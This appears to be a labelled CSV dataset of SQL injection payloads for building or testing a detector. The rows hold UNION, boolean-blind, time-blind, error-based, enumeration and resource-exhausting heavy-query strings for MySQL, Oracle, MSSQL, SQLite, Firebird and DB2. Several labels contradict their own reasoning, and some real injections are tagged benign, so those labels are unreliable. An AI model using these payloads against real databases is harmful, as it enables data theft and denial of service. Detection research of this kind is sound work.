id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
23264,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( ""jwzy"" = ""jwzy",heavy_query,sqlite,0.70,"contains 7+ digit number (DoS-style payload); Pattern match: 'randomblob (' → SQLite signature",1
23265,1'|| ( select 'ymre' where 8681 = 8681,boolean_blind,generic,0.70,"generic SQL structure without strong signal; simple equality test with select; insufficient evidence",1
23266,1' ) ) and 3526 = 1354,boolean_blind,generic,0.90,"Pattern match: 'and 3526 = 1354' → boolean_blind (P3); both A and C sources agree on type and DB",2
23267,"-5496 union all select 2099,2099,2099#",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23268,"1"" rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ""wcze"" = ""wcze",time_blind,mysql,0.70,"Pattern match: 'rlike (' → boolean_blind (P3); MySQL signature; sources disagree (A says boolean vs C time_blind)",1
23269,select ( case when ( 8208 = 7960 ) then 8208 else 8208* ( select 8208 from information_schema.character_sets ) end ) #,boolean_blind,mysql,0.70,"generic SQL structure without strong signal; boolean branching with MySQL info_schema; sources disagree",1
23270,"-4210"" ) where 2679 = 2679 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --",error_based,oracle,0.90,"Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); both A and C confirm Oracle signature",2
23271,"1 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) # urzg",heavy_query,generic,0.70,"contains 7+ digit number (DoS-style payload); PostgreSQL signature; sources disagree on classification",1
23272,"1"" ) ) and elt ( 3785 = 9386,9386 ) and ( ( ""inwa"" like ""inwa",boolean_blind,mysql,0.70,"Pattern match: 'elt (' → boolean_blind (P3); MySQL signature; sources disagree on classification",1
23273,"1"" ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",time_blind,mysql,0.70,"Pattern match: 'rlike (' → boolean_blind (P3); MySQL signature; sources disagree on classification",1
23274,1 ) ) as vcvn where 2106 = 2106,benign,generic,0.50,"no attack signal detected; simple aliased where clause without injection; sources disagree (A says union vs C says boolean)",0
23275,"-8609' union all select 9384,9384,9384,9384--",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23276,"1 where 5332 = 5332 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",boolean_blind,mysql,0.70,"Pattern match: 'elt (' → boolean_blind (P3); MySQL signature; sources disagree on classification",1
23277,"1"" ) as ivuv where 5691 = 5691",benign,generic,0.50,"no attack signal detected; simple aliased where clause without injection; sources disagree (A says union vs C says boolean)",0
23278,if ( 2643 = 1393 ) select 2643 else drop function nqss--,boolean_blind,mssql,0.70,"generic SQL structure without strong signal; MSSQL if/else pattern; sources disagree on classification",1
23279,"1"" ) ) and ( 3020 = 3020 ) *6703 and ( ( ""njdx"" like ""njdx",benign,generic,0.50,"no SQLi signal in heuristic check; arithmetic with like clause; sources disagree (A says boolean vs C says benign)",0
23280,"1"" ) and ( 4085 = 4885 ) *4885 and ( ""sxte"" = ""sxte",benign,generic,0.50,"no SQLi signal in heuristic check; arithmetic with equality; sources disagree (A says boolean vs C says benign)",0
23281,"-9557 ) where 2891 = 2891 union all select 2891,2891,2891,2891,2891,2891,2891,2891,2891--",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23282,"1"" union all select null,null,null,null,null,null,null,null--",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23283,1' ) waitfor delay '0:0:5'--,time_blind,mssql,0.90,"Pattern match: 'waitfor delay' → time_blind (P5); both A and C sources confirm MSSQL signature",2
23284,"1' ) as bdei where 9531 = 9531 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.70,"generic SQL keywords without specific signal; domain system enumeration; sources disagree on classification",1
23285,"1' ) ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.70,"generic SQL keywords without specific signal; domain system enumeration; sources disagree on classification",1
23286,"1%' ) ) ) union all select null,null,null,null,null,null,null,null#",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23287,"1' in boolean mode ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.70,"Pattern match: 'benchmark (' → time_blind (P5); MySQL signature; DoS-style heavy payload evident",1
23288,"1 or elt ( 6272 = 6272,sleep ( 5 ) )",boolean_blind,mysql,0.50,"Pattern match: 'elt (' → boolean_blind (P3); MySQL signature; sources disagree (A says boolean vs C says benign)",0
23289,"1' where 8969 = 8969 union all select null,null,null,null,null--",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23290,-5299 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ),boolean_blind,generic,0.70,"generic SQL keywords without specific signal; sources disagree (A says error vs C says boolean); generic DB",1
23291,"iif ( 2840 = 3788,1,1/0 )",benign,generic,0.50,"no attack signal detected; MSSQL iif function with arithmetic; sources disagree (A says boolean vs C says benign)",0
23292,"1"" ) ) as xwrq where 4161 = 4161",benign,generic,0.50,"no attack signal detected; simple aliased where clause without injection; sources disagree (A says union vs C says boolean)",0
23293,-4681 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) # rltx,boolean_blind,oracle,0.50,"generic SQL keywords without specific signal; Oracle signature; sources disagree (A says boolean vs C says benign)",0
23294,"1%"" ) ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.70,"Pattern match: 'benchmark (' → time_blind (P5); MySQL signature; DoS-style heavy payload evident",1
23295,select ( case when ( 2968 = 2021 ) then 1 else 2968* ( select 2968 from master..sysdatabases ) end ) --,boolean_blind,mssql,0.70,"generic SQL structure without strong signal; MSSQL master database pattern; sources disagree",1
23296,"1' ) ) as fusi where 2788 = 2788 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.90,"Pattern match: 'benchmark (' → time_blind (P5); both A and C confirm MySQL time-based blind signature",2
23297,"1' and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and 'kudh' like 'kudh",boolean_blind,mysql,0.70,"Pattern match: 'elt (' → boolean_blind (P3); MySQL signature; sources disagree on classification",1
23298,"-9947"" ) ) ) union all select 8765,8765,8765,8765,8765#",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23299,1 ) as phja where 4627 = 4627,benign,generic,0.50,"no attack signal detected; simple aliased where clause without injection; sources disagree (A says union vs C says boolean)",0
23300,"1 ) where 5550 = 5550 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",heavy_query,mysql,0.70,"contains 7+ digit number (DoS-style payload); PostgreSQL signature mismatch; sources disagree",1
23301,"-9937' ) ) union all select 3900,3900,3900,3900,3900,3900,3900,3900,3900#",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23302,"1%"" ) ) and elt ( 7633 = 4110,4110 ) and ( ( ""%"" = """,boolean_blind,mysql,0.70,"Pattern match: 'elt (' → boolean_blind (P3); MySQL signature; sources disagree on classification",1
23303,"1' ) where 6387 = 6387 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.70,"generic SQL keywords without specific signal; MSSQL system enumeration (sysusers); sources disagree",1
23304,"1' and elt ( 1533 = 5695,5695 ) and 'ycgi' = 'ycgi",boolean_blind,mysql,0.70,"Pattern match: 'elt (' → boolean_blind (P3); MySQL signature; sources disagree on classification",1
23305,"1"" or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ""xqgt"" like ""xqgt",boolean_blind,db2,0.70,"generic SQL keywords without specific signal; DB2 system enumeration (sysibm.systables); sources disagree",1
23306,"1%' and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and '%' = '",boolean_blind,mysql,0.70,"Pattern match: 'elt (' → boolean_blind (P3); MySQL signature; sources disagree on classification",1
23307,"-4798"" ) ) ) union all select 7892,7892,7892,7892,7892,7892,7892,7892,7892,7892#",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23308,"1"" ) where 3250 = 3250 union all select null#",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23309,"1%' ) ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( '%' = '",boolean_blind,generic,0.70,"generic SQL keywords without specific signal; domain system enumeration; sources disagree on classification",1
23310,"1' ) ) ) union all select null,null,null,null,null,null,null,null#",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23311,-6855' ) or 8519 = 9248,boolean_blind,generic,0.90,"Pattern match: 'or 8519 = 9248' → boolean_blind (P3); both A and C sources agree on type and DB",2
23312,"-4764 ) where 8200 = 8200 union all select 8200,8200,8200,8200--",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23313,"1"" ) ) as qrrx where 4633 = 4633 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,generic,0.70,"generic SQL keywords without specific signal; Oracle table enumeration (all_users); sources disagree",1
23314,"1"" ) ) as gqxk where 9199 = 9199 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --",error_based,oracle,0.90,"Pattern match: 'xmltype (' → error_based (P4); both A and C sources confirm Oracle signature",2
23315,"1'+ ( select lgkd where 7801 = 7801 and elt ( 4249 = 4249,7259 ) ) +'",boolean_blind,mysql,0.70,"Pattern match: 'elt (' → boolean_blind (P3); MySQL signature; sources disagree on classification",1
23316,"1 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) -- btqa",boolean_blind,mysql,0.70,"Pattern match: 'elt (' → boolean_blind (P3); MySQL signature; sources disagree on classification",1
23317,"1"" ) ) as lfte where 3811 = 3811 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",boolean_blind,mysql,0.70,"Pattern match: 'elt (' → boolean_blind (P3); MySQL signature; sources disagree on classification",1
23318,1' and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ),error_based,oracle,0.90,"Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); both A and C confirm Oracle signature",2
23319,"1 ) ) as bgdm where 3473 = 3473 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",boolean_blind,mysql,0.70,"Pattern match: 'elt (' → boolean_blind (P3); MySQL signature; sources disagree on classification",1
23320,"1' and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and 'lwir' like 'lwir",boolean_blind,firebird,0.70,"generic SQL keywords without specific signal; Firebird system enumeration (rdb$ prefix); sources disagree",1
23321,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4#",boolean_blind,firebird,0.70,"generic SQL keywords without specific signal; Firebird system enumeration (rdb$ prefix); sources disagree",1
23322,"-3063%"" ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( ""%"" = """,error_based,oracle,0.90,"Pattern match: 'xmltype (' → error_based (P4); both A and C sources confirm Oracle signature",2
23323,-5389'|| ( select 'gggl' where 1020 = 1020 union all select 1020#,union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23324,"1%"" ) union all select null,null,null#",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23325,"1"" where 9172 = 9172 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",boolean_blind,mysql,0.70,"Pattern match: 'elt (' → boolean_blind (P3); MySQL signature; sources disagree on classification",1
23326,"1"" or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.70,"generic SQL keywords without specific signal; domain system enumeration; sources disagree on classification",1
23327,"-8013%"" or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""%"" = """,boolean_blind,generic,0.70,"generic SQL keywords without specific signal; MSSQL char concatenation pattern; sources disagree",1
23328,select ( case when ( 4043 = 5276 ) then 4043 else 4043* ( select 4043 from information_schema.character_sets ) end ) #,boolean_blind,mysql,0.70,"generic SQL structure without strong signal; boolean branching with MySQL info_schema; sources disagree",1
23329,"1 ) where 8691 = 8691 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",heavy_query,sqlite,0.70,"contains 7+ digit number (DoS-style payload); Pattern match: 'randomblob (' → SQLite signature",1
23330,"-3555' ) or make_set ( 9354 = 9354,7185 ) and ( 'papr' = 'papr",boolean_blind,mysql,0.50,"generic SQL keywords without specific signal; sources disagree (A says boolean vs C says benign); MySQL DB",0
23331,"1%"" ) ) union all select null,null,null,null,null--",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23332,-6473' union all select 7537#,union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23333,1'+ ( select 'yahq' where 6974 = 6974 union all select null--,union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23334,"1' ) where 8268 = 8268 union all select null,null,null,null--",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23335,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( '%' = '",heavy_query,generic,0.70,"contains 7+ digit number (DoS-style payload); PostgreSQL signature; sources disagree on classification",1
23336,1' ) ) and ( 3020 = 3020 ) *6703 and ( ( 'pfal' = 'pfal,benign,generic,0.50,"no SQLi signal in heuristic check; arithmetic with equality; sources disagree (A says boolean vs C says benign)",0
23337,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and '%' = '",boolean_blind,generic,0.70,"generic SQL keywords without specific signal; domain system enumeration; sources disagree on classification",1
23338,"end and ""xlvn"" = ""xlvn",benign,generic,0.50,"no SQLi signal in heuristic check; SQL keyword fragment with equality; insufficient evidence",0
23339,"1' ) ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( 'istb' = 'istb",heavy_query,postgresql,0.90,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); both A and C confirm PostgreSQL signature",2
23340,"1' ) ) as mxxd where 7255 = 7255 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,firebird,0.70,"generic SQL keywords without specific signal; Firebird system enumeration (rdb$ prefix); sources disagree",1
23341,1%' ) order by 1#,benign,generic,0.50,"no attack signal detected; simple order by without injection context; lacks malicious pattern",0
23342,"1 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) -- kvkk",time_blind,mysql,0.90,"Pattern match: 'benchmark (' → time_blind (P5); both A and C confirm MySQL time-based blind signature",2
23343,"-2441' union all select 1853,1853,1853,1853,1853,1853,1853--",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
